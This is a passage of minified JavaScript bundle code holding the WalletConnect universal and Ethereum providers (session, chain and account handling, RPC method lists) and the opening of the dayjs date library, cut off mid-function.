Sz=Object.defineProperty,Nz=(t,e,r)=>e in t?Sz(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,nl=(t,e,r)=>Nz(t,typeof e!="symbol"?e+"":e,r);let Pz=class{constructor(e){nl(this,"name","tezos"),nl(this,"client"),nl(this,"httpProviders"),nl(this,"events"),nl(this,"namespace"),nl(this,"chainId"),this.namespace=e.namespace,this.events=Ze("events"),this.client=Ze("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,r){if(this.chainId=e,!this.httpProviders[e]){const n=r||wn(`${this.name}:${e}`,this.namespace);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);this.setHttpProvider(e,n)}this.events.emit(Hn.DEFAULT_CHAIN_CHANGED,`${this.name}:${this.chainId}`)}getAccounts(){const e=this.namespace.accounts;return e?e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2])||[]:[]}createHttpProviders(){const e={};return this.namespace.chains.forEach(r=>{e[r]=this.createHttpProvider(r)}),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||wn(e,this.namespace);return typeof n>"u"?void 0:new jn(new gi(n))}};var kz=Object.defineProperty,Oz=(t,e,r)=>e in t?kz(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,il=(t,e,r)=>Oz(t,typeof e!="symbol"?e+"":e,r);let _z=class{constructor(e){il(this,"name",El),il(this,"client"),il(this,"httpProviders"),il(this,"events"),il(this,"namespace"),il(this,"chainId"),this.namespace=e.namespace,this.events=Ze("events"),this.client=Ze("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace.chains=[...new Set((this.namespace.chains||[]).concat(e.chains||[]))],this.namespace.accounts=[...new Set((this.namespace.accounts||[]).concat(e.accounts||[]))],this.namespace.methods=[...new Set((this.namespace.methods||[]).concat(e.methods||[]))],this.namespace.events=[...new Set((this.namespace.events||[]).concat(e.events||[]))],this.httpProviders=this.createHttpProviders()}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider(e.chainId).request(e.request)}setDefaultChain(e,r){this.httpProviders[e]||this.setHttpProvider(e,r),this.chainId=e,this.events.emit(Hn.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(r=>r.split(":")[1]===this.chainId.toString()).map(r=>r.split(":")[2]))]:[]}createHttpProviders(){var e,r;const n={};return(r=(e=this.namespace)==null?void 0:e.accounts)==null||r.forEach(i=>{const s=Hl(i);n[`${s.namespace}:${s.reference}`]=this.createHttpProvider(i)}),n}getHttpProvider(e){const r=this.httpProviders[e];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,r){const n=this.createHttpProvider(e,r);n&&(this.httpProviders[e]=n)}createHttpProvider(e,r){const n=r||wn(e,this.namespace,this.client.core.projectId);if(!n)throw new Error(`No RPC url provided for chainId: ${e}`);return new jn(new gi(n,Ze("disableProviderPing")))}};var Tz=Object.defineProperty,$z=Object.defineProperties,Rz=Object.getOwnPropertyDescriptors,t4=Object.getOwnPropertySymbols,Dz=Object.prototype.hasOwnProperty,Bz=Object.prototype.propertyIsEnumerable,Cy=(t,e,r)=>e in t?Tz(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Np=(t,e)=>{for(var r in e||(e={}))Dz.call(e,r)&&Cy(t,r,e[r]);if(t4)for(var r of t4(e))Bz.call(e,r)&&Cy(t,r,e[r]);return t},Ew=(t,e)=>$z(t,Rz(e)),En=(t,e,r)=>Cy(t,typeof e!="symbol"?e+"":e,r);class t1{constructor(e){En(this,"client"),En(this,"namespaces"),En(this,"optionalNamespaces"),En(this,"sessionProperties"),En(this,"scopedProperties"),En(this,"events",new Tb),En(this,"rpcProviders",{}),En(this,"session"),En(this,"providerOpts"),En(this,"logger"),En(this,"uri"),En(this,"disableProviderPing",!1),this.providerOpts=e,this.logger=typeof(e==null?void 0:e.logger)<"u"&&typeof(e==null?void 0:e.logger)!="string"?e.logger:Kf(Zg({level:(e==null?void 0:e.logger)||H5})),this.disableProviderPing=(e==null?void 0:e.disableProviderPing)||!1}static async init(e){const r=new t1(e);return await r.initialize(),r}async request(e,r,n){const[i,s]=this.validateChain(r);if(!this.session)throw new Error("Please call connect() before request()");return await this.getProvider(i).request({request:Np({},e),chainId:`${i}:${s}`,topic:this.session.topic,expiry:n})}sendAsync(e,r,n,i){const s=new Date().getTime();this.request(e,n,i).then(o=>r(null,Jg(s,o))).catch(o=>r(o,void 0))}async enable(){if(!this.client)throw new Error("Sign Client not initialized");return this.session||await this.connect({namespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties,scopedProperties:this.scopedProperties}),await this.requestAccounts()}async disconnect(){var e;if(!this.session)throw new Error("Please call connect() before enable()");await this.client.disconnect({topic:(e=this.session)==null?void 0:e.topic,reason:it("USER_DISCONNECTED")}),await this.cleanup()}async connect(e){if(!this.client)throw new Error("Sign Client not initialized");if(this.setNamespaces(e),await this.cleanupPendingPairings(),!e.skipPairing)return await this.pair(e.pairingTopic)}async authenticate(e,r){if(!this.client)throw new Error("Sign Client not initialized");this.setNamespaces(e),await this.cleanupPendingPairings();const{uri:n,response:i}=await this.client.authenticate(e,r);n&&(this.uri=n,this.events.emit("display_uri",n));const s=await i();if(this.session=s.session,this.session){const o=Q5(this.session.namespaces);this.namespaces=yw(this.namespaces,o),await this.persist("namespaces",this.namespaces),this.onConnect()}return s}on(e,r){this.events.on(e,r)}once(e,r){this.events.once(e,r)}removeListener(e,r){this.events.removeListener(e,r)}off(e,r){this.events.off(e,r)}get isWalletConnect(){return!0}async pair(e){const{uri:r,approval:n}=await this.client.connect({pairingTopic:e,requiredNamespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties,scopedProperties:this.scopedProperties});r&&(this.uri=r,this.events.emit("display_uri",r));const i=await n();this.session=i;const s=Q5(i.namespaces);return this.namespaces=yw(this.namespaces,s),await this.persist("namespaces",this.namespaces),await this.persist("optionalNamespaces",this.optionalNamespaces),this.onConnect(),this.session}setDefaultChain(e,r){try{if(!this.session)return;const[n,i]=this.validateChain(e),s=this.getProvider(n);s.name===El?s.setDefaultChain(`${n}:${i}`,r):s.setDefaultChain(i,r)}catch(n){if(!/Please call connect/.test(n.message))throw n}}async cleanupPendingPairings(e={}){this.logger.info("Cleaning up inactive pairings...");const r=this.client.pairing.getAll();if(hi(r)){for(const n of r)e.deletePairings?this.client.core.expirer.set(n.topic,0):await this.client.core.relayer.subscriber.unsubscribe(n.topic);this.logger.info(`Inactive pairings cleared: ${r.length}`)}}abortPairingAttempt(){this.logger.warn("abortPairingAttempt is deprecated. This is now a no-op.")}async checkStorage(){this.namespaces=await this.getFromStore("namespaces")||{},this.optionalNamespaces=await this.getFromStore("optionalNamespaces")||{},this.session&&this.createProviders()}async initialize(){this.logger.trace("Initialized"),await this.createClient(),await this.checkStorage(),this.registerEventListeners()}async createClient(){var e,r;if(this.client=this.providerOpts.client||await rF.init({core:this.providerOpts.core,logger:this.providerOpts.logger||H5,relayUrl:this.providerOpts.relayUrl||dF,projectId:this.providerOpts.projectId,metadata:this.providerOpts.metadata,storageOptions:this.providerOpts.storageOptions,storage:this.providerOpts.storage,name:this.providerOpts.name,customStoragePrefix:this.providerOpts.customStoragePrefix,telemetryEnabled:this.providerOpts.telemetryEnabled}),this.providerOpts.session)try{this.session=this.client.session.get(this.providerOpts.session.topic)}catch(n){throw this.logger.error("Failed to get session",n),new Error(`The provided session: ${(r=(e=this.providerOpts)==null?void 0:e.session)==null?void 0:r.topic} doesn't exist in the Sign client`)}else{const n=this.client.session.getAll();this.session=n[0]}this.logger.trace("SignClient Initialized")}createProviders(){if(!this.client)throw new Error("Sign Client not initialized");if(!this.session)throw new Error("Session not initialized. Please call connect() before enable()");const e=[...new Set(Object.keys(this.session.namespaces).map(r=>ad(r)))];vw("client",this.client),vw("events",this.events),vw("disableProviderPing",this.disableProviderPing),e.forEach(r=>{if(!this.session)return;const n=ZF(r,this.session),i=dA(n),s=yw(this.namespaces,this.optionalNamespaces),o=Ew(Np({},s[r]),{accounts:n,chains:i});switch(r){case"eip155":this.rpcProviders[r]=new iz({namespace:o});break;case"algorand":this.rpcProviders[r]=new fz({namespace:o});break;case"solana":this.rpcProviders[r]=new az({namespace:o});break;case"cosmos":this.rpcProviders[r]=new uz({namespace:o});break;case"polkadot":this.rpcProviders[r]=new YF({namespace:o});break;case"cip34":this.rpcProviders[r]=new wz({namespace:o});break;case"elrond":this.rpcProviders[r]=new bz({namespace:o});break;case"multiversx":this.rpcProviders[r]=new Cz({namespace:o});break;case"near":this.rpcProviders[r]=new Iz({namespace:o});break;case"tezos":this.rpcProviders[r]=new Pz({namespace:o});break;default:this.rpcProviders[El]?this.rpcProviders[El].updateNamespace(o):this.rpcProviders[El]=new _z({namespace:o})}})}registerEventListeners(){if(typeof this.client>"u")throw new Error("Sign Client is not initialized");this.client.on("session_ping",e=>{var r;const{topic:n}=e;n===((r=this.session)==null?void 0:r.topic)&&this.events.emit("session_ping",e)}),this.client.on("session_event",e=>{var r;const{params:n,topic:i}=e;if(i!==((r=this.session)==null?void 0:r.topic))return;const{event:s}=n;if(s.name==="accountsChanged"){const o=s.data;o&&hi(o)&&this.events.emit("accountsChanged",o.map(J5))}else if(s.name==="chainChanged"){const o=n.chainId,a=n.event.data,c=ad(o),l=bw(o)!==bw(a)?`${c}:${bw(a)}`:o;this.onChainChanged(l)}else this.events.emit(s.name,s.data);this.events.emit("session_event",e)}),this.client.on("session_update",({topic:e,params:r})=>{var n,i;if(e!==((n=this.session)==null?void 0:n.topic))return;const{namespaces:s}=r,o=(i=this.client)==null?void 0:i.session.get(e);this.session=Ew(Np({},o),{namespaces:s}),this.onSessionUpdate(),this.events.emit("session_update",{topic:e,params:r})}),this.client.on("session_delete",async e=>{var r;e.topic===((r=this.session)==null?void 0:r.topic)&&(await this.cleanup(),this.events.emit("session_delete",e),this.events.emit("disconnect",Ew(Np({},it("USER_DISCONNECTED")),{data:e.topic})))}),this.on(Hn.DEFAULT_CHAIN_CHANGED,e=>{this.onChainChanged(e,!0)})}getProvider(e){return this.rpcProviders[e]||this.rpcProviders[El]}onSessionUpdate(){Object.keys(this.rpcProviders).forEach(e=>{var r;this.getProvider(e).updateNamespace((r=this.session)==null?void 0:r.namespaces[e])})}setNamespaces(e){const{namespaces:r,optionalNamespaces:n,sessionProperties:i,scopedProperties:s}=e;r&&Object.keys(r).length&&(this.namespaces=r),n&&Object.keys(n).length&&(this.optionalNamespaces=n),this.sessionProperties=i,this.scopedProperties=s}validateChain(e){const[r,n]=(e==null?void 0:e.split(":"))||["",""];if(!this.namespaces||!Object.keys(this.namespaces).length)return[r,n];if(r&&!Object.keys(this.namespaces||{}).map(o=>ad(o)).includes(r))throw new Error(`Namespace '${r}' is not configured. Please call connect() first with namespace config.`);if(r&&n)return[r,n];const i=ad(Object.keys(this.namespaces)[0]),s=this.rpcProviders[i].getDefaultChain();return[i,s]}async requestAccounts(){const[e]=this.validateChain();return await this.getProvider(e).requestAccounts()}async onChainChanged(e,r=!1){if(!this.namespaces)return;const[n,i]=this.validateChain(e);if(!i)return;this.updateNamespaceChain(n,i),this.events.emit("chainChanged",i);const s=this.getProvider(n).getDefaultChain();r||this.getProvider(n).setDefaultChain(i),this.emitAccountsChangedOnChainChange({namespace:n,previousChainId:s,newChainId:e}),await this.persist("namespaces",this.namespaces)}emitAccountsChangedOnChainChange({namespace:e,previousChainId:r,newChainId:n}){var i,s;try{if(r===n)return;const o=(s=(i=this.session)==null?void 0:i.namespaces[e])==null?void 0:s.accounts;if(!o)return;const a=o.filter(c=>c.includes(`${n}:`)).map(J5);if(!hi(a))return;this.events.emit("accountsChanged",a)}catch(o){this.logger.warn("Failed to emit accountsChanged on chain change",o)}}updateNamespaceChain(e,r){if(!this.namespaces)return;const n=this.namespaces[e]?e:`${e}:${r}`,i={chains:[],methods:[],events:[],defaultChain:r};this.namespaces[n]?this.namespaces[n]&&(this.namespaces[n].defaultChain=r):this.namespaces[n]=i}onConnect(){this.createProviders(),this.events.emit("connect",{session:this.session})}async cleanup(){this.namespaces=void 0,this.optionalNamespaces=void 0,this.sessionProperties=void 0,await this.deleteFromStore("namespaces"),await this.deleteFromStore("optionalNamespaces"),await this.deleteFromStore("sessionProperties"),this.session=void 0,await this.cleanupPendingPairings({deletePairings:!0}),await this.cleanupStorage()}async persist(e,r){var n;const i=((n=this.session)==null?void 0:n.topic)||"";await this.client.core.storage.setItem(`${Ip}/${e}${i}`,r)}async getFromStore(e){var r;const n=((r=this.session)==null?void 0:r.topic)||"";return await this.client.core.storage.getItem(`${Ip}/${e}${n}`)}async deleteFromStore(e){var r;const n=((r=this.session)==null?void 0:r.topic)||"";await this.client.core.storage.removeItem(`${Ip}/${e}${n}`)}async cleanupStorage(){var e;try{if(((e=this.client)==null?void 0:e.session.length)>0)return;const r=await this.client.core.storage.getKeys();for(const n of r)n.startsWith(Ip)&&await this.client.core.storage.removeItem(n)}catch(r){this.logger.warn("Failed to cleanup storage",r)}}}const Lz=t1,ng={};var r4={};const Uz="wc",Mz="ethereum_provider",Fz=`${Uz}@2:${Mz}:`,zz="https://rpc.walletconnect.org/v1/",Ay=["eth_sendTransaction","personal_sign"],jz=["eth_accounts","eth_requestAccounts","eth_sendRawTransaction","eth_sign","eth_signTransaction","eth_signTypedData","eth_signTypedData_v3","eth_signTypedData_v4","eth_sendTransaction","personal_sign","wallet_switchEthereumChain","wallet_addEthereumChain","wallet_getPermissions","wallet_requestPermissions","wallet_registerOnboarding","wallet_watchAsset","wallet_scanQRCode","wallet_sendCalls","wallet_getCapabilities","wallet_getCallsStatus","wallet_showCallsStatus"],xy=["chainChanged","accountsChanged"],Hz=["chainChanged","accountsChanged","message","disconnect","connect"];var qz=Object.defineProperty,Vz=Object.defineProperties,Wz=Object.getOwnPropertyDescriptors,n4=Object.getOwnPropertySymbols,Gz=Object.prototype.hasOwnProperty,Kz=Object.prototype.propertyIsEnumerable,Iy=(t,e,r)=>e in t?qz(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,ya=(t,e)=>{for(var r in e||(e={}))Gz.call(e,r)&&Iy(t,r,e[r]);if(n4)for(var r of n4(e))Kz.call(e,r)&&Iy(t,r,e[r]);return t},Oh=(t,e)=>Vz(t,Wz(e)),Xr=(t,e,r)=>Iy(t,typeof e!="symbol"?e+"":e,r);function ig(t){return Number(t[0].split(":")[1])}function Pp(t){return`0x${t.toString(16)}`}function Zz(t){const{chains:e,optionalChains:r,methods:n,optionalMethods:i,events:s,optionalEvents:o,rpcMap:a}=t;if(!hi(e))throw new Error("Invalid chains");const c={chains:e,methods:n||Ay,events:s||xy,rpcMap:ya({},e.length?{[ig(e)]:a[ig(e)]}:{})},l=s==null?void 0:s.filter(f=>!xy.includes(f)),u=n==null?void 0:n.filter(f=>!Ay.includes(f));if(!r&&!o&&!i&&!(l!=null&&l.length)&&!(u!=null&&u.length))return{required:e.length?c:void 0};const h=(l==null?void 0:l.length)&&(u==null?void 0:u.length)||!r,d={chains:[...new Set(h?c.chains.concat(r||[]):r)],methods:[...new Set(c.methods.concat(i!=null&&i.length?i:jz))],events:[...new Set(c.events.concat(o!=null&&o.length?o:Hz))],rpcMap:a};return{required:e.length?c:void 0,optional:r.length?d:void 0}}class t2{constructor(){Xr(this,"events",new mn.EventEmitter),Xr(this,"namespace","eip155"),Xr(this,"accounts",[]),Xr(this,"signer"),Xr(this,"chainId",1),Xr(this,"modal"),Xr(this,"rpc"),Xr(this,"STORAGE_KEY",Fz),Xr(this,"on",(e,r)=>(this.events.on(e,r),this)),Xr(this,"once",(e,r)=>(this.events.once(e,r),this)),Xr(this,"removeListener",(e,r)=>(this.events.removeListener(e,r),this)),Xr(this,"off",(e,r)=>(this.events.off(e,r),this)),Xr(this,"parseAccount",e=>this.isCompatibleChainId(e)?this.parseAccountId(e).address:e),this.signer={},this.rpc={}}static async init(e){const r=new t2;return await r.initialize(e),r}async request(e,r){return await this.signer.request(e,this.formatChainId(this.chainId),r)}sendAsync(e,r,n){this.signer.sendAsync(e,r,this.formatChainId(this.chainId),n)}get connected(){return this.signer.client?this.signer.client.core.relayer.connected:!1}get connecting(){return this.signer.client?this.signer.client.core.relayer.connecting:!1}async enable(){return this.session||await this.connect(),await this.request({method:"eth_requestAccounts"})}async connect(e){var r;if(!this.signer.client)throw new Error("Provider not initialized. Call init() first");this.loadConnectOpts(e);const{required:n,optional:i}=Zz(this.rpc);try{const s=await new Promise(async(a,c)=>{var l,u;this.rpc.showQrModal&&((l=this.modal)==null||l.open(),(u=this.modal)==null||u.subscribeState(d=>{!d.open&&!this.signer.session&&(this.signer.abortPairingAttempt(),c(new Error("Connection request reset. Please try again.")))}));const h=e!=null&&e.scopedProperties?{[this.namespace]:e.scopedProperties}:void 0;await this.signer.connect(Oh(ya({namespaces:ya({},n&&{[this.namespace]:n})},i&&{optionalNamespaces:{[this.namespace]:i}}),{pairingTopic:e==null?void 0:e.pairingTopic,scopedProperties:h})).then(d=>{a(d)}).catch(d=>{var f;(f=this.modal)==null||f.showErrorMessage("Unable to connect"),c(new Error(d.message))})});if(!s)return;const o=Qv(s.namespaces,[this.namespace]);this.setChainIds(this.rpc.chains.length?this.rpc.chains:o),this.setAccounts(o),this.events.emit("connect",{chainId:Pp(this.chainId)})}catch(s){throw this.signer.logger.error(s),s}finally{(r=this.modal)==null||r.close()}}async authenticate(e,r){var n;if(!this.signer.client)throw new Error("Provider not initialized. Call init() first");this.loadConnectOpts({chains:e==null?void 0:e.chains});try{const i=await new Promise(async(o,a)=>{var c,l;this.rpc.showQrModal&&((c=this.modal)==null||c.open(),(l=this.modal)==null||l.subscribeState(u=>{!u.open&&!this.signer.session&&(this.signer.abortPairingAttempt(),a(new Error("Connection request reset. Please try again.")))})),await this.signer.authenticate(Oh(ya({},e),{chains:this.rpc.chains}),r).then(u=>{o(u)}).catch(u=>{var h;(h=this.modal)==null||h.showErrorMessage("Unable to connect"),a(new Error(u.message))})}),s=i.session;if(s){const o=Qv(s.namespaces,[this.namespace]);this.setChainIds(this.rpc.chains.length?this.rpc.chains:o),this.setAccounts(o),this.events.emit("connect",{chainId:Pp(this.chainId)})}return i}catch(i){throw this.signer.logger.error(i),i}finally{(n=this.modal)==null||n.close()}}async disconnect(){this.session&&await this.signer.disconnect(),this.reset()}get isWalletConnect(){return!0}get session(){return this.signer.session}registerEventListeners(){this.signer.on("session_event",e=>{const{params:r}=e,{event:n}=r;n.name==="accountsChanged"?(this.accounts=this.parseAccounts(n.data),this.events.emit("accountsChanged",this.accounts)):n.name==="chainChanged"?this.setChainId(this.formatChainId(n.data)):this.events.emit(n.name,n.data),this.events.emit("session_event",e)}),this.signer.on("accountsChanged",e=>{this.accounts=this.parseAccounts(e),this.events.emit("accountsChanged",this.accounts)}),this.signer.on("chainChanged",e=>{const r=parseInt(e);this.chainId=r,this.events.emit("chainChanged",Pp(this.chainId)),this.persist()}),this.signer.on("session_update",e=>{this.events.emit("session_update",e)}),this.signer.on("session_delete",e=>{this.reset(),this.events.emit("session_delete",e),this.events.emit("disconnect",Oh(ya({},it("USER_DISCONNECTED")),{data:e.topic,name:"USER_DISCONNECTED"}))}),this.signer.on("display_uri",e=>{this.events.emit("display_uri",e)})}switchEthereumChain(e){this.request({method:"wallet_switchEthereumChain",params:[{chainId:e.toString(16)}]})}isCompatibleChainId(e){return typeof e=="string"?e.startsWith(`${this.namespace}:`):!1}formatChainId(e){return`${this.namespace}:${e}`}parseChainId(e){return Number(e.split(":")[1])}setChainIds(e){const r=e.filter(n=>this.isCompatibleChainId(n)).map(n=>this.parseChainId(n));r.length&&(this.chainId=r[0],this.events.emit("chainChanged",Pp(this.chainId)),this.persist())}setChainId(e){if(this.isCompatibleChainId(e)){const r=this.parseChainId(e);this.chainId=r,this.switchEthereumChain(r)}}parseAccountId(e){const[r,n,i]=e.split(":");return{chainId:`${r}:${n}`,address:i}}setAccounts(e){this.accounts=e.filter(r=>this.parseChainId(this.parseAccountId(r).chainId)===this.chainId).map(r=>this.parseAccountId(r).address),this.events.emit("accountsChanged",this.accounts)}getRpcConfig(e){var r,n;const i=(r=e==null?void 0:e.chains)!=null?r:[],s=(n=e==null?void 0:e.optionalChains)!=null?n:[],o=i.concat(s);if(!o.length)throw new Error("No chains specified in either `chains` or `optionalChains`");const a=i.length?(e==null?void 0:e.methods)||Ay:[],c=i.length?(e==null?void 0:e.events)||xy:[],l=(e==null?void 0:e.optionalMethods)||[],u=(e==null?void 0:e.optionalEvents)||[],h=(e==null?void 0:e.rpcMap)||this.buildRpcMap(o,e.projectId),d=(e==null?void 0:e.qrModalOptions)||void 0;return{chains:i==null?void 0:i.map(f=>this.formatChainId(f)),optionalChains:s.map(f=>this.formatChainId(f)),methods:a,events:c,optionalMethods:l,optionalEvents:u,rpcMap:h,showQrModal:!!(e!=null&&e.showQrModal),qrModalOptions:d,projectId:e.projectId,metadata:e.metadata}}buildRpcMap(e,r){const n={};return e.forEach(i=>{n[i]=this.getRpcUrl(i,r)}),n}async initialize(e){if(this.rpc=this.getRpcConfig(e),this.chainId=this.rpc.chains.length?ig(this.rpc.chains):ig(this.rpc.optionalChains),this.signer=await Lz.init({projectId:this.rpc.projectId,metadata:this.rpc.metadata,disableProviderPing:e.disableProviderPing,relayUrl:e.relayUrl,storage:e.storage,storageOptions:e.storageOptions,customStoragePrefix:e.customStoragePrefix,telemetryEnabled:e.telemetryEnabled,logger:e.logger}),this.registerEventListeners(),await this.loadPersistedSession(),this.rpc.showQrModal){let r;try{const{createAppKit:n}=await Promise.resolve().then(function(){return sG}),{convertWCMToAppKitOptions:i}=await Promise.resolve().then(function(){return wG}),s=i(Oh(ya({},this.rpc.qrModalOptions),{chains:[...new Set([...this.rpc.chains,...this.rpc.optionalChains])],metadata:this.rpc.metadata,projectId:this.rpc.projectId}));if(!s.networks.length)throw new Error("No networks found for WalletConnect");r=n(Oh(ya({},s),{universalProvider:this.signer,manualWCControl:!0}))}catch{throw new Error("To use QR modal, please install @reown/appkit package")}if(r)try{this.modal=r}catch(n){throw this.signer.logger.error(n),new Error("Could not generate WalletConnectModal Instance")}}}loadConnectOpts(e){if(!e)return;const{chains:r,optionalChains:n,rpcMap:i}=e;r&&hi(r)&&(this.rpc.chains=r.map(s=>this.formatChainId(s)),r.forEach(s=>{this.rpc.rpcMap[s]=(i==null?void 0:i[s])||this.getRpcUrl(s)})),n&&hi(n)&&(this.rpc.optionalChains=[],this.rpc.optionalChains=n==null?void 0:n.map(s=>this.formatChainId(s)),n.forEach(s=>{this.rpc.rpcMap[s]=(i==null?void 0:i[s])||this.getRpcUrl(s)}))}getRpcUrl(e,r){var n;return((n=this.rpc.rpcMap)==null?void 0:n[e])||`${zz}?chainId=eip155:${e}&projectId=${r||this.rpc.projectId}`}async loadPersistedSession(){if(this.session)try{const e=await this.signer.client.core.storage.getItem(`${this.STORAGE_KEY}/chainId`),r=this.session.namespaces[`${this.namespace}:${e}`]?this.session.namespaces[`${this.namespace}:${e}`]:this.session.namespaces[this.namespace];this.setChainIds(e?[this.formatChainId(e)]:r==null?void 0:r.accounts),this.setAccounts(r==null?void 0:r.accounts)}catch(e){this.signer.logger.error("Failed to load persisted session, clearing state..."),this.signer.logger.error(e),await this.disconnect().catch(r=>this.signer.logger.warn(r))}}reset(){this.chainId=1,this.accounts=[]}persist(){this.session&&this.signer.client.core.storage.setItem(`${this.STORAGE_KEY}/chainId`,this.chainId)}parseAccounts(e){return typeof e=="string"||e instanceof String?[this.parseAccount(e)]:e.map(r=>this.parseAccount(r))}}var r1=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{},pA={exports:{}};(function(t,e){(function(r,n){t.exports=n()})(r1,function(){var r=1e3,n=6e4,i=36e5,s="millisecond",o="second",a="minute",c="hour",l="day",u="week",h="month",d="quarter",f="year",g="date",p="Invalid Date",w=/^(\d{4})[-/]?(\d{1,2})?[-/]?(\d{0,2})[Tt\s]*(\d{1,2})?:?(\d{1,2})?:?(\d{1,2})?[.:]?(\d+)?$/,m=/\[([^\]]+)]|Y{1,4}|M{1,4}|D{1,2}|d{1,4}|H{1,2}|h{1,2}|a|A|m{1,2}|s{1,2}|Z{1,2}|SSS/g,b={name:"en",weekdays:"Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),months:"January_February_March_April_May_June_July_August_September_October_November_December".split("_"),ordinal:function(O){var y=["th","st","nd","rd"],E=O%100;return"["+O+(y[(E-20)%10]||y[E]||y[0])+"]"}},v=function(O,y,E){var k=String(O);return!k||k.length>=y?O:""+Array(y+1-k.length).join(E)+O},x={s:v,z:function(O){var y=-O.utcOffset(),E=Math.abs(y),k=Math.floor(E/60),_=E%60;return(y<=0?"+":"-")+v(k,2,"0")+":"+v(_,2,"0")},m:function O(y,E){if(y.date()<E.date())return-O(E,y);var k=12*(E.year()-y.year())+(E.month()-y.month()),_=y.clone().add(k,h),R=E-_<0,L=y.clone().add(k+(R?-1:1),h);return+(-(k+(E-_)/(R?_-L:L-_))||0)},a:function(O){return O<0?Math.ceil(O)||0:Math.floor(O)},p:function(O){return{M:h,y:f,w:u,d:l,D:g,h:c,m:a,s:o,ms:s,Q:d}[O]||String(O||"").toLowerCase().replace(/s$/,"")},u:function(O){return O===void 0}},I="en",C={};C[I]=b;var N="$isDayjsObject",S=function(O){return O instanceof z||!(!O||!O[N])},P=function O(y,E,k){var _;if(!y)return I;if(typeof y=="string"){var R=y.toLowerCase();C[R]&&(_=R),E&&(C[R]=E,_=R);var L=y.split("-");if(!_&&L.length>1)return O(L[0])}else{var q=y.name;C[q]=y,_=q}return!k&&_&&(I=_),_||!k&&I},T=function(O,y){if(S(O))return O.clone();var E=typeof y=="object"?y:{};return E.date=O,E.args=arguments,new z(E)},D=x;D.l=P,D.i=S,D.w=function(O,y){return T(O,{locale:y.$L,utc:y.$u,x:y.$x,$offset:y.$offset})};var z=function(){function O(E){this.$L=P(E.locale,null,!0),this.parse(E),this.$x=this.$x||E.x||{},this[N]=!0}var y=O.prototype;return y.parse=function(E){this.$d=function(k){var _=k.date,R=k.utc;if(_===null)return new Date(NaN);if(D.u(_))return new Date;if(_ instanceof Date)return new Date(_);if(typeof _=="string"&&!/Z$/i.test(_)){var L=_.match(w);if(L){var q=L[2]-1||0,W=(L[7]||"0").substring(0,3);return R?new Date(Date.UTC(L[1],q,L[3]||1,L[4]||0,L[5]||0,L[6]||0,W)):new Date(L[1],q,L[3]||1,L[4]||0,L[5]||0,L[6]||0,W)}}return new Date(_)}(E),this.init()},y.init=function(){var E=this.$d;this.$y=E.getFullYear(),this.$M=E.getMonth(),this.$D=E.getDate(),this.$W=E.getDay(),this.$H=E.getHours(),this.$m=E.getMinutes(),this.$s=E.getSeconds(),this.$ms=E.getMilliseconds()},y.$utils=function(){return D},y.isValid=function(){return this.$d.toString()!==p},y.isSame=function(E,k){var _=T(E);return this.startOf(k)<=_&&_<=this.endOf(k)},y.isAfter=function(E,k){return T(E)<this.startOf(k)},y.isBefore=function(E,k){return this.endOf(k)<T(E)},y.$g=function(E,k,_){return D.u(E)?this[k]:this.set(_,E)},y.unix=function(){return Math.floor(this.valueOf()/1e3)},y.valueOf=function(){return this.$d.getTime()},y.startOf=function(E,k){var _=this,R=!!D.u(k)||k,L=D.p(E),q=function(be,ke){var Me=D.w(_.$u?Date.UTC(_.$y,ke,be):new Date(_.$y,ke,be),_);return R?Me:Me.endOf(l)},W=function(be,ke){return D.w(_.toDate()[be].apply(_.toDate("s"),(R?[0,0,0,0]:[23,59,59,999]).slice(ke)),_)},Z=this.$W,G=this.$M,ne=this.$D,de="set"+(this.$u?"UTC":"");switch(L){case f:return R?q(1,0):q(31,11);case h:return R?q(1,G):q(0,G+1);case u:var Se=this.$locale().weekStart||0,Ne=(Z<Se?Z+7:Z)-Se;return q(R?ne-Ne:ne+(6-Ne),G);case l:case g:return W(de+"Hours",0);case c:return W(de+"Minutes",1);case a:return W(de+"Seconds",2);case o:return W(de+"Milliseconds",3);default:return this.clone()}},y.endOf=function(E){return this.startOf(E,!1)},y.$set=function(E,k){var _,R=D.p(E),L="set"+(this.$u?"UTC":""),q=(_={},_[l]=L+"Date",_[g]=L+"Date",_[h]=L+"Month",_[f]=L+"FullYear",_[c]=L+"Hours",_[a]=L+"Minutes",_[o]=L+"Seconds",_[s]=L+"Milliseconds",_)[R],W=R===l?this.$D+(k-this.$W):k;if(R===h||R===f){var Z=this.clone().set(g,1);Z.$d[q](W),Z.init(),this.$d=Z.set(g,Math.min(this.$D,Z.daysInMonth())).$d}else 